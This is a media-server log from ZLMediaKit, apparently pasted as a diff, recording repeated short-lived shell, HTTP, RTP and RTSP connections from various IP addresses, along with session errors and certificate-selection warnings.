+2024-08-23 11:34:11.930 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950407248(35.176.98.149:42108) end of file
+2024-08-23 11:34:11.930 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950407248(35.176.98.149:42108) 
+2024-08-23 11:34:37.632 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950407248(35.176.98.149:50096) 
+2024-08-23 11:34:37.814 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950407248(35.176.98.149:50096) end of file
+2024-08-23 11:34:37.814 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950407248(35.176.98.149:50096) 
+2024-08-23 11:35:02.878 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950406848(35.176.98.149:58354) 
+2024-08-23 11:35:03.054 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950406848(35.176.98.149:58354) end of file
+2024-08-23 11:35:03.054 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950406848(35.176.98.149:58354) 
+2024-08-23 11:35:29.382 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950407248(35.176.98.149:46246) 
+2024-08-23 11:35:29.572 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950407248(35.176.98.149:46246) end of file
+2024-08-23 11:35:29.572 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950407248(35.176.98.149:46246) 
+2024-08-23 11:35:57.924 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950406848(35.176.98.149:42426) 
+2024-08-23 11:35:58.118 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950406848(35.176.98.149:42426) end of file
+2024-08-23 11:35:58.118 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950406848(35.176.98.149:42426) 
+2024-08-23 11:36:25.813 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950407248(35.176.98.149:52106) 
+2024-08-23 11:36:26.004 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950407248(35.176.98.149:52106) end of file
+2024-08-23 11:36:26.004 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950407248(35.176.98.149:52106) 
+2024-08-23 11:36:27.711 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(20.225.3.116:37572) 
+2024-08-23 11:36:27.711 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 11:36:28.879 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(20.225.3.116:37572) end of file
+2024-08-23 11:36:28.879 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(20.225.3.116:37572) 
+2024-08-23 11:36:29.030 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(20.225.3.116:37578) 
+2024-08-23 11:36:29.030 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 11:36:30.189 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(20.225.3.116:37578) end of file
+2024-08-23 11:36:30.190 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(20.225.3.116:37578) 
+2024-08-23 11:36:30.349 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(20.225.3.116:33816) 
+2024-08-23 11:36:30.349 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 11:36:31.509 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(20.225.3.116:33816) end of file
+2024-08-23 11:36:31.509 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(20.225.3.116:33816) 
+2024-08-23 11:36:31.675 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(20.225.3.116:33828) 
+2024-08-23 11:36:31.675 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 11:36:32.841 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(20.225.3.116:33828) end of file
+2024-08-23 11:36:32.841 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(20.225.3.116:33828) 
+2024-08-23 11:36:33.003 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(20.225.3.116:33836) 
+2024-08-23 11:36:33.003 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 11:36:34.165 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(20.225.3.116:33836) end of file
+2024-08-23 11:36:34.165 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(20.225.3.116:33836) 
+2024-08-23 11:36:34.326 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(20.225.3.116:33848) 
+2024-08-23 11:36:34.327 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 11:36:35.486 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(20.225.3.116:33848) end of file
+2024-08-23 11:36:35.486 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(20.225.3.116:33848) 
+2024-08-23 11:36:35.659 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(20.225.3.116:33850) 
+2024-08-23 11:36:35.659 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 11:36:36.820 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(20.225.3.116:33850) end of file
+2024-08-23 11:36:36.820 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(20.225.3.116:33850) 
+2024-08-23 11:36:36.978 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(20.225.3.116:33858) 
+2024-08-23 11:36:36.979 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 11:36:38.147 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(20.225.3.116:33858) end of file
+2024-08-23 11:36:38.147 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(20.225.3.116:33858) 
+2024-08-23 11:36:38.298 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(20.225.3.116:33866) 
+2024-08-23 11:36:38.299 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 11:36:39.458 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(20.225.3.116:33866) end of file
+2024-08-23 11:36:39.458 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(20.225.3.116:33866) 
+2024-08-23 11:36:39.618 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(20.225.3.116:60800) 
+2024-08-23 11:36:39.619 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 11:36:40.778 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(20.225.3.116:60800) end of file
+2024-08-23 11:36:40.778 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(20.225.3.116:60800) 
+2024-08-23 11:36:54.166 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950418448(35.176.98.149:60828) 
+2024-08-23 11:36:54.359 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950418448(35.176.98.149:60828) end of file
+2024-08-23 11:36:54.359 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950418448(35.176.98.149:60828) 
+2024-08-23 11:37:20.820 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950418448(35.176.98.149:59224) 
+2024-08-23 11:37:21.024 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950418448(35.176.98.149:59224) end of file
+2024-08-23 11:37:21.024 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950418448(35.176.98.149:59224) 
+2024-08-23 11:37:30.901 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950418448(59.83.208.108:49108) 
+2024-08-23 11:37:30.912 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950418448(59.83.208.108:49108) connection reset by peer
+2024-08-23 11:37:30.912 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950418448(59.83.208.108:49108) 
+2024-08-23 11:37:30.923 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950418448(59.83.208.107:50976) 
+2024-08-23 11:37:30.935 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950418448(59.83.208.107:50976) connection reset by peer
+2024-08-23 11:37:30.936 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950418448(59.83.208.107:50976) 
+2024-08-23 11:37:31.309 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950418448(180.101.245.248:17558) 
+2024-08-23 11:37:31.320 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950418448(180.101.245.248:17558) connection reset by peer
+2024-08-23 11:37:31.320 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950418448(180.101.245.248:17558) 
+2024-08-23 11:37:35.458 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950418448(180.101.245.248:18516) 
+2024-08-23 11:37:35.467 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950418448(180.101.245.248:18516) end of file
+2024-08-23 11:37:35.467 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950418448(180.101.245.248:18516) 
+2024-08-23 11:37:42.130 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(194.50.16.25:52851) 
+2024-08-23 11:37:51.350 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950295152(35.176.98.149:54840) 
+2024-08-23 11:37:51.567 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950295152(35.176.98.149:54840) end of file
+2024-08-23 11:37:51.567 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950295152(35.176.98.149:54840) 
+2024-08-23 11:38:01.389 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950415248(35.176.98.149:21933) session timeout
+2024-08-23 11:38:01.389 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950415248(35.176.98.149:21933) 
+2024-08-23 11:38:13.393 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(194.50.16.25:52851) session timeout
+2024-08-23 11:38:13.393 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(194.50.16.25:52851) 
+2024-08-23 11:38:17.890 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950298624(35.176.98.149:38480) 
+2024-08-23 11:38:18.105 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950298624(35.176.98.149:38480) end of file
+2024-08-23 11:38:18.105 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950298624(35.176.98.149:38480) 
+2024-08-23 11:38:46.326 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950298624(35.176.98.149:44388) 
+2024-08-23 11:38:46.538 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950298624(35.176.98.149:44388) end of file
+2024-08-23 11:38:46.538 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950298624(35.176.98.149:44388) 
+2024-08-23 11:39:13.098 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950298624(35.176.98.149:60364) 
+2024-08-23 11:39:13.281 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950298624(35.176.98.149:60364) end of file
+2024-08-23 11:39:13.281 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950298624(35.176.98.149:60364) 
+2024-08-23 11:40:55.843 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950298624(35.176.98.149:36122) 
+2024-08-23 11:40:56.044 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950298624(35.176.98.149:36122) end of file
+2024-08-23 11:40:56.044 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950298624(35.176.98.149:36122) 
+2024-08-23 11:41:22.353 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950298624(35.176.98.149:49160) 
+2024-08-23 11:41:22.559 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950298624(35.176.98.149:49160) end of file
+2024-08-23 11:41:22.559 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950298624(35.176.98.149:49160) 
+2024-08-23 11:41:51.228 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950298624(35.176.98.149:58100) 
+2024-08-23 11:41:51.411 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950298624(35.176.98.149:58100) end of file
+2024-08-23 11:41:51.411 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950298624(35.176.98.149:58100) 
+2024-08-23 11:42:23.159 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950298624(35.176.98.149:50650) 
+2024-08-23 11:42:23.413 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950298624(35.176.98.149:50650) end of file
+2024-08-23 11:42:23.413 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950298624(35.176.98.149:50650) 
+2024-08-23 11:43:06.631 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950298624(35.176.98.149:53130) 
+2024-08-23 11:43:06.826 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950298624(35.176.98.149:53130) end of file
+2024-08-23 11:43:06.826 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950298624(35.176.98.149:53130) 
+2024-08-23 11:43:45.791 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(113.30.150.23:51010) 
+2024-08-23 11:43:47.883 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(113.30.150.23:51010) end of file
+2024-08-23 11:43:47.883 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(113.30.150.23:51010) 
+2024-08-23 11:43:50.238 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950296896(35.176.98.149:36106) 
+2024-08-23 11:43:50.413 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950296896(35.176.98.149:36106) end of file
+2024-08-23 11:43:50.413 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950296896(35.176.98.149:36106) 
+2024-08-23 11:44:07.930 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950296896(220.196.160.75:59614) 
+2024-08-23 11:44:07.935 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950296896(220.196.160.75:59614) connection reset by peer
+2024-08-23 11:44:07.935 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950296896(220.196.160.75:59614) 
+2024-08-23 11:44:15.421 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950296896(220.196.160.101:33946) 
+2024-08-23 11:44:15.428 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950296896(220.196.160.101:33946) end of file
+2024-08-23 11:44:15.428 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950296896(220.196.160.101:33946) 
+2024-08-23 11:44:35.517 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950296896(180.101.244.15:34348) 
+2024-08-23 11:44:35.526 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950296896(180.101.244.15:34348) connection reset by peer
+2024-08-23 11:44:35.526 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950296896(180.101.244.15:34348) 
+2024-08-23 11:47:57.428 D MediaServer[22196-event poller 2] ShellSession.cpp:26 ShellSession | 140493950296896(59.83.208.108:28658) 
+2024-08-23 11:47:57.440 W MediaServer[22196-event poller 2] ShellSession.cpp:61 onError | 140493950296896(59.83.208.108:28658) connection reset by peer
+2024-08-23 11:47:57.440 D MediaServer[22196-event poller 2] ShellSession.cpp:31 ~ShellSession | 140493950296896(59.83.208.108:28658) 
+2024-08-23 11:52:42.399 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(149.50.103.48:33496) 
+2024-08-23 11:52:52.394 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(149.50.103.48:33496) end of file
+2024-08-23 11:52:52.394 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(149.50.103.48:33496) 
+2024-08-23 11:59:53.920 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(209.141.53.28:48902) 
+2024-08-23 11:59:53.921 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(209.141.53.28:48902) close connection after send http body completed.
+2024-08-23 11:59:53.921 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(209.141.53.28:48902) 
+2024-08-23 12:11:17.108 D MediaServer[22196-event poller 2] RtpSession.cpp:35 RtpSession | 140493950298240(199.45.154.148:47946) 
+2024-08-23 12:11:20.337 W MediaServer[22196-event poller 2] RtpSession.cpp:62 onError |  connection reset by peer
+2024-08-23 12:11:20.337 D MediaServer[22196-event poller 2] RtpSession.cpp:41 ~RtpSession | 140493950298240(199.45.154.148:47946) 
+2024-08-23 12:11:20.689 D MediaServer[22196-event poller 2] RtpSession.cpp:35 RtpSession | 140493950298240(199.45.154.148:41024) 
+2024-08-23 12:11:26.849 W MediaServer[22196-event poller 2] RtpSession.cpp:62 onError |  connection reset by peer
+2024-08-23 12:11:26.849 D MediaServer[22196-event poller 2] RtpSession.cpp:41 ~RtpSession | 140493950298240(199.45.154.148:41024) 
+2024-08-23 12:11:27.176 D MediaServer[22196-event poller 2] RtpSession.cpp:35 RtpSession | 140493950298240(199.45.154.148:41070) 
+2024-08-23 12:11:36.585 W MediaServer[22196-event poller 2] RtpSession.cpp:62 onError |  connection reset by peer
+2024-08-23 12:11:36.585 D MediaServer[22196-event poller 2] RtpSession.cpp:41 ~RtpSession | 140493950298240(199.45.154.148:41070) 
+2024-08-23 12:11:36.891 D MediaServer[22196-event poller 2] RtpSession.cpp:35 RtpSession | 140493950298240(199.45.154.148:55624) 
+2024-08-23 12:11:38.046 W MediaServer[22196-event poller 2] RtpSession.cpp:62 onError |  end of file
+2024-08-23 12:11:38.046 D MediaServer[22196-event poller 2] RtpSession.cpp:41 ~RtpSession | 140493950298240(199.45.154.148:55624) 
+2024-08-23 12:17:07.517 D MediaServer[22196-event poller 2] RtpSession.cpp:35 RtpSession | 140493950298240(180.101.245.252:36234) 
+2024-08-23 12:17:18.432 W MediaServer[22196-event poller 2] RtpSession.cpp:62 onError |  illegal connection
+2024-08-23 12:17:18.432 D MediaServer[22196-event poller 2] RtpSession.cpp:41 ~RtpSession | 140493950298240(180.101.245.252:36234) 
+2024-08-23 12:17:18.643 D MediaServer[22196-event poller 2] RtpSession.cpp:35 RtpSession | 140493950298240(220.196.160.146:17866) 
+2024-08-23 12:17:30.436 W MediaServer[22196-event poller 2] RtpSession.cpp:62 onError |  illegal connection
+2024-08-23 12:17:30.436 D MediaServer[22196-event poller 2] RtpSession.cpp:41 ~RtpSession | 140493950298240(220.196.160.146:17866) 
+2024-08-23 12:17:34.551 D MediaServer[22196-event poller 2] RtpSession.cpp:35 RtpSession | 140493950298240(220.196.160.51:19112) 
+2024-08-23 12:17:46.443 W MediaServer[22196-event poller 2] RtpSession.cpp:62 onError |  illegal connection
+2024-08-23 12:17:46.443 D MediaServer[22196-event poller 2] RtpSession.cpp:41 ~RtpSession | 140493950298240(220.196.160.51:19112) 
+2024-08-23 12:41:26.722 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(172.169.191.208:38044) 
+2024-08-23 12:41:27.366 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(172.169.191.208:38044) end of file
+2024-08-23 12:41:27.366 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(172.169.191.208:38044) 
+2024-08-23 12:44:09.876 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(207.46.13.229:25564) 
+2024-08-23 12:44:10.057 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(207.46.13.229:25564) end of file
+2024-08-23 12:44:10.057 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(207.46.13.229:25564) 
+2024-08-23 12:44:19.901 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(207.46.13.126:39442) 
+2024-08-23 12:44:32.464 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(207.46.13.126:39442) end of file
+2024-08-23 12:44:32.464 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(207.46.13.126:39442) 
+2024-08-23 12:46:04.458 D MediaServer[22196-event poller 2] RtspSession.cpp:53 RtspSession | 140493950419328(162.216.150.122:61446) 
+2024-08-23 12:46:15.844 W MediaServer[22196-event poller 2] RtspSession.cpp:65 onError | 140493950419328(162.216.150.122:61446) RTSP播放器(//)断开:end of file,耗时(s):11
+2024-08-23 12:46:15.844 D MediaServer[22196-event poller 2] RtspSession.cpp:59 ~RtspSession | 140493950419328(162.216.150.122:61446) 
+2024-08-23 12:54:38.506 D MediaServer[22196-event poller 2] RtspSession.cpp:53 RtspSession | 140493950410592(220.196.160.151:48974) 
+2024-08-23 12:54:38.510 D MediaServer[22196-event poller 2] RtspSession.cpp:53 RtspSession | 140493950419328(220.196.160.151:48976) 
+2024-08-23 12:54:55.146 W MediaServer[22196-event poller 2] RtspSession.cpp:65 onError | 140493950419328(220.196.160.151:48976) RTSP播放器(//)断开:illegal connection,耗时(s):16
+2024-08-23 12:54:55.146 W MediaServer[22196-event poller 2] RtspSession.cpp:65 onError | 140493950410592(220.196.160.151:48974) RTSP播放器(//)断开:illegal connection,耗时(s):16
+2024-08-23 12:54:55.146 D MediaServer[22196-event poller 2] RtspSession.cpp:59 ~RtspSession | 140493950419328(220.196.160.151:48976) 
+2024-08-23 12:54:55.146 D MediaServer[22196-event poller 2] RtspSession.cpp:59 ~RtspSession | 140493950410592(220.196.160.151:48974) 
+2024-08-23 13:01:50.464 D MediaServer[22196-event poller 2] RtpSession.cpp:35 RtpSession | 140493950293088(83.222.190.78:62670) 
+2024-08-23 13:02:01.233 W MediaServer[22196-event poller 2] RtpSession.cpp:62 onError |  illegal connection
+2024-08-23 13:02:01.233 D MediaServer[22196-event poller 2] RtpSession.cpp:41 ~RtpSession | 140493950293088(83.222.190.78:62670) 
+2024-08-23 13:12:36.390 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(205.210.31.75:56564) 
+2024-08-23 13:12:38.655 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(205.210.31.75:56564) end of file
+2024-08-23 13:12:38.655 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(205.210.31.75:56564) 
+2024-08-23 13:16:41.050 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(185.224.128.59:40774) 
+2024-08-23 13:16:41.210 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(185.224.128.59:40774) end of file
+2024-08-23 13:16:41.210 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(185.224.128.59:40774) 
+2024-08-23 13:22:03.256 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(220.196.160.95:42186) 
+2024-08-23 13:22:03.257 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950300016(220.196.160.53:20218) 
+2024-08-23 13:22:03.261 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(220.196.160.95:42186) end of file
+2024-08-23 13:22:03.261 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(220.196.160.95:42186) 
+2024-08-23 13:22:03.264 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950300016(220.196.160.53:20218) end of file
+2024-08-23 13:22:03.264 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950300016(220.196.160.53:20218) 
+2024-08-23 13:22:03.447 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(180.101.245.248:20430) 
+2024-08-23 13:22:05.696 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(180.101.245.248:20430) end of file
+2024-08-23 13:22:05.696 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(180.101.245.248:20430) 
+2024-08-23 13:22:17.922 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950297664(185.224.128.84:53942) 
+2024-08-23 13:22:18.092 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950297664(185.224.128.84:53942) connection reset by peer
+2024-08-23 13:22:18.092 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950297664(185.224.128.84:53942) 
+2024-08-23 13:29:45.165 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950297664(87.236.176.161:40857) 
+2024-08-23 13:29:48.166 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950297664(87.236.176.161:40857) close connection after send http body completed.
+2024-08-23 13:29:48.166 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950297664(87.236.176.161:40857) 
+2024-08-23 13:41:45.832 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(66.175.213.4:14698) 
+2024-08-23 13:42:16.166 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(66.175.213.4:14698) session timeout
+2024-08-23 13:42:16.166 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(66.175.213.4:14698) 
+2024-08-23 13:42:16.172 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(185.242.226.117:54227) 
+2024-08-23 13:42:16.457 W MediaServer[22196-event poller 2] SSLBox.cpp:126 findCertificate | can not find any certificate of host:124.222.73.231, select default certificate of:zlmedaikit
+2024-08-23 13:42:26.897 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(185.242.226.117:54227) end of file
+2024-08-23 13:42:26.897 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(185.242.226.117:54227) 
+2024-08-23 13:46:24.123 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(180.163.30.100:42660) 
+2024-08-23 13:46:54.312 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(180.163.30.100:42660) session timeout
+2024-08-23 13:46:54.312 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(180.163.30.100:42660) 
+2024-08-23 13:52:41.507 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(147.185.133.235:62278) 
+2024-08-23 13:52:51.225 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(147.185.133.235:62278) end of file
+2024-08-23 13:52:51.226 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(147.185.133.235:62278) 
+2024-08-23 13:54:00.571 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(42.192.66.53:61140) 
+2024-08-23 13:54:32.548 T MediaServer[22196-event poller 2] HttpSession.cpp:122 onError | 140493950293088(42.192.66.53:61140) session timeout
+2024-08-23 13:54:32.549 T MediaServer[22196-event poller 2] HttpSession.cpp:31 ~HttpSession | 140493950293088(42.192.66.53:61140) 
+2024-08-23 13:58:57.674 T MediaServer[22196-event poller 2] HttpSession.cpp:25 HttpSession | 140493950293088(180.163.28.114:58854) 
